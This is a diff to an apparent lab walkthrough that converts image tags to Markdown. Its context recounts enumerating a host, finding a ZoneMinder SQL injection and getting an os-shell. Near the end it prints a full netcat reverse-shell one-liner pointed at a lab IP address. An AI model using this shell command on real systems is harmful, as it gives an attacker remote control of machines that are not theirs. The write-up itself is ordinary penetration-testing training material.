@@ -24,15 +24,15 @@ FTP doesn't allow for anonymous connections.
 
 Port 80 shows a login page:
 
-<figure><img src="../../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(495).png>)
 
 Default creds don't work, so I ran a `gobuster` scan while moving on. Port 3305 shows a default Apache page:
 
-<figure><img src="../../../.gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(496).png>)
 
 Ran a `gobuster` scan on this too while enumerating port 8080, which had Tomcat.
 
-<figure><img src="../../../.gitbook/assets/image (3426).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3426).png>)
 
 Again we have no credentials. The `gobuster` scan revealed there was ZoneMinder on both ports:
 
@@ -55,7 +55,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /zm                   (Status: 301) [Size: 320] [-> http://192.168.157.52/zm/]
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1048).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1048).png>)
 
 This version had an SQL Injection exploit:
 
@@ -111,4 +111,4 @@ This found the `limit` variable to be vulnerable to SQL Injection and I got a we
 os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.196 3305 >/tmp/f
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2997).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2997).png>)
